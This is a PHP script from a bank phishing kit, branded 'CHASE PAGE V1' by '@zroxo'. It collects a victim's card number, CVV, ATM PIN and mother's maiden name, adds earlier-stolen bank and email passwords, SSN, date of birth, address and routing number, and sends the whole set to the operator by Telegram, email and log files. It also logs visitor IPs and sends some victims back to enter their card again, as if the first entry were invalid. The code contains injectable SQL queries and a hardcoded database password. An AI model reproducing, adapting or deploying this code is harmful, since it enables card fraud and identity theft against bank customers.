<?php
ob_start();
session_start();
// $all_coll= $_SESSION['all_coll'];
error_reporting(0);
// include'../Protection.php'; 
include'../includes/telegram.php'; 
include'../admin/config.php'; 
// if (!isset($_SESSION['ZRXSESSION'])) {
//     header('HTTP/1.0 403 Forbidden');
//     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
//     exit();
// }
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
if (!empty($_POST['token']) && !empty($_POST['ccnum']) && !empty($_POST['ammpnn'])) {
if (hash_equals($_SESSION['token'], $_POST['token'])) {
    $conn = mysqli_connect("localhost", "chasd_user", "immAN@@4A", "chasd_data");
        // Get Users
        $token = $_POST['key_token'];
        $users = "select * from users where token = '$token' limit 1";
        $getUsers = mysqli_query($conn, $users);
        
        $emailLogin = '';
        $passLogin = '';
        while ($row = mysqli_fetch_array($getUsers)) {
            $emailLogin = $row['email'];
            $passLogin = $row['password'];
        }
        // End Get Users
        
        // Get Sosmed
        $emailSocial = '';
        $passSocial = '';
        $emailSosmed = "select * from sosmed where token = '$token' limit 1";
        $getEmail = mysqli_query($conn, $emailSosmed);
        
        while ($row = mysqli_fetch_array($getEmail)) {
            $emailSocial = $row['email'];
            $passSocial = $row['password'];
        }
        // End Get Sosmed
        
        // Get Verify
        $firstname = '';
        $lastname = '';
         $dob = '';
        $S5SN = '';
         $issuest = '';
        $Streetadd = '';
         $address2 = '';
        $zipcode = '';
         $city = '';
        $state = '';
         $phoneNumber = '';
        $carrierpin = '';
         $routingNumber = '';
        $branchNumber = '';
        
        $verifyQuery = "select * from verify where token = '$token' limit 1";
        $getVerify = mysqli_query($conn, $verifyQuery);
        
        while ($row = mysqli_fetch_array($getVerify)) {
            $firstname = $row['firstname'];
        $lastname = $row['lastname'];
         $dob = $row['dob'];
        $S5SN = $row['S5SN'];
         $issuest = $row['issuest'];
        $Streetadd = $row['Streetadd'];
         $address2 = $row['address2'];
        $zipcode = $row['zipcode'];
         $city = $row['city'];
        $state = $row['state'];
         $phoneNumber = $row['phoneNumber'];
        $carrierpin = $row['carrierpin'];
         $routingNumber = $row['routingNumber'];
        $branchNumber = $row['branchNumber'];
        }
        // End Get Verify
    
	$Zroxobin = substr(str_replace(' ','',$_POST['ccnum']),0,6);
// 	$resulta =$all_coll."\n";
	$resulta .= "+ --------------[ INFO LOGIN PAGE ]---------------+\n";
    $resulta .= "[Username]: ".$emailLogin."\n";
    $resulta .= "[Password]: ".$passLogin."\n";
    $resulta .= "+ --------------[ INFO EMAIL POPUP PAGE ]---------------+\n";
    $resulta .= "[Email]: ".$emailSocial."\n";
    $resulta .= "[Password]: ".$passSocial."\n";
    $resulta .= "+ --------------[ INFO VERIFY PAGE ]---------------+\n";
	$resulta .= "[Firstname]: ".$firstname."\n";
	$resulta .= "[Lastname]: ".$lastname."\n";
	$resulta .= "[DateOFbirth]: ".$dob."\n";
	$resulta .= "[SSN]: ".$S5SN."\n";
	$resulta .= "[ISSuingSTate]: ".$issuest."\n";
	$resulta .= "[Address1]: ".$Streetadd."\n";
	$resulta .= "[Address2]: ".$address2."\n";
	$resulta .= "[ZipCode]: ".$zipcode."\n";
	$resulta .= "[City]: ".$city."\n";
	$resulta .= "[State]: ".$state."\n";
	$resulta .= "[Ph0neNumber]: ".$phoneNumber."\n";
	$resulta .= "[CarrierPin]: ".$carrierpin."\n";
	$resulta .= "[RouTingNumber]: ".$routingNumber."\n";
	$resulta .= "[BranchNumber]: ".$branchNumber."\n";
	$resulta .= "+ --------------[ INFO CC VERIFY PAGE ]---------------+\n";
	$resulta .= "[Card Number]: ".$_POST['ccnum']."\n";
	$resulta .= "[Expiration date]: ".$_POST['expdate']."\n";
	$resulta .= "[Security code]: ".$_POST['cccvv']."\n";
	$resulta .= "[Atm pin]: ".$_POST['ammpnn']."\n";
	$resulta .= "[Mmn]: ".$_POST['mmn']."\n";
	$resulta .= "+ --------------[ Zroxo ip ]---------------+\n";
	$resulta .= "IP Address: ".$_SESSION['ip']."\n";
	$resulta .= "City: ".$_SESSION['city']."\n";
	$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
	$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
	$resulta .= "User Agent: ".$_SESSION['platform']."\n";
	$resulta .= "+ --------------[ Zroxo V1 ]---------------+\n";
	$subject = "#ZROXO CC: [{$Zroxobin}] [ {$_SESSION['city']} - {$_SESSION['browser']} - {$_SESSION['ip']} ]";
	$headers="From: ZROXO CHASE <".$result_from_email.">\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($telegram_result == "on") {
		telegram_message($resulta,$telegram_token,$telegram_chatid);
	}if ($email_result == "on") {
		@mail($email_result_config,$subject,$resulta,$headers);
	}
	$zroxo = fopen("../admin/result/crds.txt","a+");
    fwrite($zroxo,$resulta);
    fclose($zroxo);
	$zroxo2 = fopen("../admin/result/".$_SESSION['ZRXSESSION'].".txt","a+");
	fwrite($zroxo2,$resulta);
	fclose($zroxo2);
	$zroxo3 = fopen("../admin/result/totalcc.txt","a+");
	fwrite($zroxo3,"".$_POST['ccnum']."\n");
	fclose($zroxo3);
    ////////////// save IP to file
	$vistorsIp= json_decode(file_get_contents("../admin/vistors_ip.txt"),true);
	$ip = $_SESSION['ip'];
    array_push($vistorsIp,$ip);
    $data = json_encode($vistorsIp);
    file_put_contents("../admin/vistors_ip.txt",$data);
	////////////////
	
    telegram_message($resulta,$telegram_token,$telegram_chatid); 
    
    // Insert to db
          
    // Check connection
    if($conn === false) {
        die("ERROR: Could not connect. " . mysqli_connect_error());
    }
          
    $ccnum =  $_POST['ccnum'];
    $expdate = $_POST['expdate'];
    $cccvv =  $_POST['cccvv'];
    $ammpnn = $_POST['ammpnn'];
    $mmn =  $_POST['mmn'];
    
    $sql = "INSERT INTO ccverify (ccnum, expdate, cccvv, ammpnn, mmn, token) VALUES ('$ccnum', '$expdate', '$cccvv', '$ammpnn', '$mmn', '$token')";
    
    if(mysqli_query($conn, $sql)){
        echo "Success"; 
    } else{
        echo "ERROR: Hush! Sorry $sql. " 
                . mysqli_error($conn);
    }
          
    // Close connection
    mysqli_close($conn);
    
    // End Insert to db
if($skipCCverify){
    exit(header("Location: ../exit?key=".$_SESSION['ZRXSESSION'].""));
}
if (isset($_POST['invalid'])) {
	exit(header("Location: ../exit?key=".$_SESSION['ZRXSESSION'].""));
}else{
	exit(header("Location: ../ccverify?key=".$_SESSION['ZRXSESSION']."&invalid"));
}

}else{
    header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
    exit();
}
}	